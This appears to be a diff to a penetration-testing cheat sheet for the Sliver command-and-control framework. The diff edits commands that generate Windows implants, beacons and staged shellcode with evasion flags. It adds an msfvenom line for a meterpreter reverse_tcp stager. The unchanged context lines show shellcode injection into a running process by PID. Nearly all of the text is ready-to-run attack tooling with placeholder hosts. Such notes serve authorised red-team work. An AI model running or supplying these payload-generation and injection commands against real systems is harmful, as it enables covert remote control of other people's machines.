@@ -412,8 +412,8 @@ sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --sa
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /PATH/TO/BINARY
-sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /PATH/TO/BINARY -G
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY
+sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY -G
 sliver > generate stager --lhost <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
@@ -424,30 +424,38 @@ sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format servi
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /PATH/TO/BINARY
-sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /PATH/TO/BINARY -G
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY
+sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY -G
 sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /tmp/<FILE>.bin -G --skip-symbols
 ```
 
 ### Profile Handling
 
 ```c
-sliver > profiles new --mtls <LHOST> --format shellcode <PROFILE>
+sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE>
 sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --save /PATH/TO/BINARY
 ```
 
 ```c
-sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe <PROFILE>
-sliver > profiles generate --save /PATH/TO/BINARY <PROFILE>
-sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe --seconds 5 --jitter 3 <PROFILE>
+sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
+sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
+sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --format c --save /PATH/TO/BINARY
+```
+
+#### Error: rpc error: code = Unknown desc = exit status 1 - Please make sure Metasploit framework >= v6.2 is installed and msfvenom/msfconsole are in your PATH
+
+> https://github.com/BishopFox/sliver/issues/1580
+
+```c
+$ msfvenom LHOST=<LHOST> LPORT=<LPORT> -p windows/x64/meterpreter/reverse_tcp -f c -o /tmp/stager.c
 ```
 
 ### Common Commands, Implant and Beacon Handling
 
 ```c
 sliver > mtls                                                             // Mutual Transport Layer Security
-sliver > mtls --lport <LPORT>                                             // Set MTLS port
+sliver > mtls --lport <LPORT>                                             // set MTLS port
 sliver > jobs                                                             // display current jobs
 sliver > implants                                                         // show all created implants
 sliver > sessions                                                         // display currently available sessions
@@ -476,7 +484,7 @@ sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // exe
 
 ```c
 sliver (NEARBY_LANGUAGE) > interactive
-sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
+sliver (NEARBY_LANGUAGE) > generate --http acme.com --format shellcode --save /PATH/TO/BINARY
 sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
 ```
 
